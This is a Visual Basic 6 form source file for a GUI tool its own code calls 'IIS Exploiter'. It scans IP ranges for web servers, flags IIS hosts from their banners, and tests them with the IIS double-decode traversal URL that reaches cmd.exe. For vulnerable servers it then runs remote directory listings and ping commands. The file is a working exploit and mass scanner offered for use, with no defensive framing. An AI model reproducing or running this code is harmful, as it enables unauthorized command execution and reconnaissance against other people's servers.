VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   Caption         =   "::"
   ClientHeight    =   6390
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   10110
   LinkTopic       =   "Form1"
   ScaleHeight     =   6390
   ScaleWidth      =   10110
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdNotepad 
      Caption         =   "View in &Notepad"
      Height          =   285
      Left            =   45
      TabIndex        =   24
      Top             =   495
      Width           =   3165
   End
   Begin VB.Frame Frame1 
      Caption         =   "Frame1"
      Height          =   1320
      Left            =   5670
      TabIndex        =   15
      Top             =   2385
      Width           =   4290
      Begin VB.TextBox txtDelay 
         Height          =   285
         Left            =   675
         TabIndex        =   20
         Text            =   "2000"
         Top             =   945
         Width           =   960
      End
      Begin VB.TextBox txtFromIP 
         Height          =   285
         Left            =   675
         TabIndex        =   19
         Top             =   270
         Width           =   1590
      End
      Begin VB.TextBox txtToIP 
         Height          =   285
         Left            =   675
         TabIndex        =   18
         Top             =   585
         Width           =   1590
      End
      Begin VB.CommandButton cmdStartScan 
         Caption         =   "&Start"
         Height          =   600
         Left            =   2340
         TabIndex        =   17
         Top             =   270
         Width           =   915
      End
      Begin VB.CommandButton cmdSaveLog 
         Caption         =   "&Save"
         Height          =   600
         Left            =   3375
         TabIndex        =   16
         Top             =   270
         Width           =   735
      End
      Begin VB.Label Label3 
         Caption         =   "From IP:"
         Height          =   195
         Left            =   45
         TabIndex        =   23
         Top             =   360
         Width           =   645
      End
      Begin VB.Label Label4 
         Caption         =   "To IP:"
         Height          =   195
         Left            =   180
         TabIndex        =   22
         Top             =   675
         Width           =   465
      End
      Begin VB.Label Label5 
         Caption         =   "Delay:"
         Height          =   195
         Left            =   180
         TabIndex        =   21
         Top             =   990
         Width           =   600
      End
   End
   Begin VB.TextBox txtCmd 
      Height          =   1545
      Left            =   5670
      MultiLine       =   -1  'True
      TabIndex        =   14
      Top             =   765
      Width           =   4290
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   9315
      Top             =   225
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.ListBox List1 
      Height          =   5520
      Left            =   0
      TabIndex        =   2
      Top             =   810
      Width           =   5550
   End
   Begin VB.ListBox lstBuggyIIS 
      Height          =   1815
      Left            =   8640
      TabIndex        =   9
      Top             =   4050
      Width           =   1365
   End
   Begin VB.Timer tmrSend 
      Interval        =   3000
      Left            =   9900
      Top             =   180
   End
   Begin VB.Timer tmrSock 
      Left            =   9855
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   9765
      Top             =   -180
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.ListBox lstIISservers 
      Height          =   1815
      Left            =   7155
      TabIndex        =   8
      Top             =   4050
      Width           =   1410
   End
   Begin VB.ListBox lstLivePC 
      Height          =   1815
      Left            =   5625
      TabIndex        =   7
      Top             =   4050
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   5670
      TabIndex        =   4
      Text            =   "<ip here>"
      Top             =   450
      Visible         =   0   'False
      Width           =   1950
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      ItemData        =   "Form1.frx":0000
      Left            =   5670
      List            =   "Form1.frx":000A
      TabIndex        =   3
      Text            =   "Dir List"
      Top             =   90
      Width           =   1950
   End
   Begin VB.CommandButton cmdCheck 
      Caption         =   "&Go"
      Height          =   600
      Left            =   7740
      TabIndex        =   1
      Top             =   90
      Width           =   825
   End
   Begin VB.TextBox txtURL 
      Height          =   285
      Left            =   855
      TabIndex        =   0
      Text            =   "http://"
      Top             =   90
      Width           =   1680
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   9585
      Top             =   -225
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      Proxy           =   "169.162.80.1"
   End
   Begin VB.Label lblOnIP 
      Height          =   240
      Left            =   5805
      TabIndex        =   13
      Top             =   6030
      Width           =   4380
   End
   Begin VB.Label Label8 
      Caption         =   "Buggy Servers"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   8685
      TabIndex        =   12
      Top             =   3825
      Width           =   1275
   End
   Begin VB.Label Label7 
      Caption         =   "IIS Servers"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   7245
      TabIndex        =   11
      Top             =   3825
      Width           =   1140
   End
   Begin VB.Label Label6 
      Caption         =   "Live IP's"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   5670
      TabIndex        =   10
      Top             =   3825
      Width           =   1320
   End
   Begin VB.Label Label2 
      Caption         =   "Function:"
      Height          =   240
      Left            =   4950
      TabIndex        =   6
      Top             =   135
      Width           =   735
   End
   Begin VB.Label Label1 
      Caption         =   "IIS Server:"
      Height          =   240
      Left            =   90
      TabIndex        =   5
      Top             =   135
      Width           =   825
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private mbTimeOut As Boolean
Private SendTimeOut As Boolean
Private SendComplete As Boolean
Private mbStop As Boolean


Private Sub cmdCheck_Click()
Dim tmpStr As String
Dim Arr() As String
Dim x As Integer

On Error GoTo err:

List1.Clear

Select Case Combo1.Text
   Case Is = "Dir List"
        If txtCmd.Text = "" Then
           tmpStr = Inet1.OpenURL(txtURL & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\")
        Else
           tmpStr = Inet1.OpenURL(txtCmd.Text)
        End If
   Case Is = "Ping"
        If txtCmd.Text = "" Then
           tmpStr = Inet1.OpenURL(txtURL & "/scripts/..%255c..%255cwinnt/system32/ping.exe? " & Text1.Text)
        Else
           tmpStr = Inet1.OpenURL(txtCmd.Text)
        End If
           
End Select

Arr = Split(tmpStr, vbCrLf)

For x = 0 To UBound(Arr) - 1
    List1.AddItem Arr(x)
Next x

If UBound(Arr) = 0 Then
   List1.AddItem tmpStr
End If

Exit Sub
err:
MsgBox err.Description
End Sub


Private Sub cmdNotepad_Click()
Dim tmpStr As String

Dim x As Integer

tmpStr = Format(Now, "HHMMSS")

Open App.Path & "\" & Format(Now, "HHMMSS") & ".tmp" For Output As #2

For x = 0 To List1.ListCount - 1
    Print #2, List1.List(x)
Next x

Close #2

Shell "c:\winnt\notepad.exe " & App.Path & "\" & tmpStr & ".tmp", vbNormalFocus


End Sub

Private Sub cmdSaveLog_Click()
Dim Filename As String
Dim x As Integer
On Error GoTo err:

'cd.FileTitle = txtFromIP & " Range"
cd.InitDir = App.Path
cd.Filename = txtFromIP & " Range.txt"
cd.ShowSave

Open cd.Filename For Output As #1
    Print #1, "Live PC's"
    For x = 0 To Me.lstLivePC.ListCount - 1
        Print #1, Me.lstLivePC.List(x)
    Next x
    Print #1, "Possible IIS Servers"
    For x = 0 To Me.lstIISservers.ListCount - 1
        Print #1, Me.lstIISservers.List(x)
    Next x
    Print #1, "Buggy Servers"
    For x = 0 To Me.lstBuggyIIS.ListCount - 1
        Print #1, Me.lstBuggyIIS.List(x)
    Next x
Close #1
MsgBox "Saved", vbInformation, "IIS Exploiter"
Exit Sub
err:
End Sub


Private Sub cmdStartScan_Click()
Dim tmpInt As Integer
Dim toIPend As Integer
Dim startIP As Integer
Dim bigNet As String
Dim x As Integer
Dim tmpStr As String

Me.lstLivePC.Clear

For x = Len(txtToIP) To 1 Step -1
    If Mid$(txtToIP, x, 1) = "." Then
       toIPend = Mid(txtToIP, x + 1)
       Exit For
    End If
Next x

For x = Len(txtFromIP) To 1 Step -1
    If Mid$(txtFromIP, x, 1) = "." Then
       startIP = Mid(txtFromIP, x + 1)
       Exit For
    End If
Next x

bigNet = Mid$(txtFromIP, 1, x)

For x = startIP To toIPend
    lblOnIP.Caption = (bigNet & x)
    OpenSocket (bigNet & x)
    DoEvents
Next x

For x = 0 To Me.lstIISservers.ListCount - 1
    tmpStr = Inet1.OpenURL("http://" & Me.lstIISservers.List(x) & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\")
    If InStr(1, tmpStr, "Directory of c:\", vbTextCompare) Then
        Me.lstBuggyIIS.AddItem Me.lstIISservers.List(x)
    End If
    DoEvents
Next x


End Sub

Private Sub Combo1_Click()

If Combo1.Text = "Ping" Then
   Text1.Visible = True
   Me.txtCmd = txtURL & "/scripts/..%255c..%255cwinnt/system32/ping.exe? " & Text1.Text
Else
   Text1.Visible = False
   txtCmd = txtURL & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\"
End If

End Sub

Private Sub List1_DblClick()
Dim Directory As String
Dim CurDir As String
Dim tmpStr As String
Dim cmdStr As String
Dim Arr() As String
Dim x As Integer

If Combo1.Text = "Dir List" Then
   Directory = Trim$(Mid$(List1.Text, InStr(1, List1.Text, ">", vbBinaryCompare) + 1))
   CurDir = Mid$(List1.List(0), 15)
   If Directory = "Directory of c:\" Then Directory = ""
   List1.Clear
   If Right(CurDir, 1) <> "\" Then
      cmdStr = txtURL & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+" & CurDir & "\" & Directory
   Else
   cmdStr = txtURL & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+" & CurDir & Directory
   End If
   cmdStr = Replace(cmdStr, " ", "%20", 1)
   txtCmd.Text = cmdStr
   tmpStr = Inet1.OpenURL(cmdStr)
   Arr = Split(tmpStr, vbCrLf)
   For x = 0 To UBound(Arr) - 1
       List1.AddItem Arr(x)
   Next x
End If

End Sub

Private Sub lstBuggyIIS_DblClick()

Me.txtURL.Text = "http://" & lstBuggyIIS.Text

End Sub

Private Sub Text1_Change()
Me.txtCmd = txtURL & "/scripts/..%255c..%255cwinnt/system32/ping.exe? " & Text1.Text
End Sub

Private Sub tmrSend_Timer()
SendTimeOut = True
End Sub

Private Sub tmrSock_Timer()
 mbTimeOut = True
End Sub

Private Sub txtURL_Change()

Me.txtCmd = txtURL & "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\"


End Sub

Private Sub Winsock1_Connect()

Me.lstLivePC.AddItem Winsock1.RemoteHostIP

Winsock1.SendData "GET @@@##################" & vbCrLf

SendComplete = False

While SendComplete = False
      DoEvents
Wend

SendTimeOut = False

While SendTimeOut = False And Winsock1.State = sckConnected
      DoEvents
Wend

If SendTimeOut = True Then
   Winsock1.Close
End If

End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim strData As String

Winsock1.GetData strData
If InStr(1, strData, "IIS", vbTextCompare) Then
   Me.lstIISservers.AddItem Winsock1.RemoteHostIP
End If

SendTimeOut = False

End Sub

Public Function OpenSocket(ByVal sIp As String) As Integer
    ' wait to see if we get a connect and bail if it takes too long
    On Error GoTo ErrOpenSocket
    

    
    mbTimeOut = False
    tmrSock.Interval = 0
    tmrSock.Interval = txtDelay
    
    Winsock1.Close
    Winsock1.Connect sIp, 80

    Do Until Winsock1.State <> sckConnecting Or mbTimeOut
        DoEvents
    Loop
    
    OpenSocket = Winsock1.State
    
' error handler
Exit Function
ErrOpenSocket:
    OpenSocket = sckError
End Function


Private Sub Winsock1_SendComplete()
SendComplete = True
End Sub
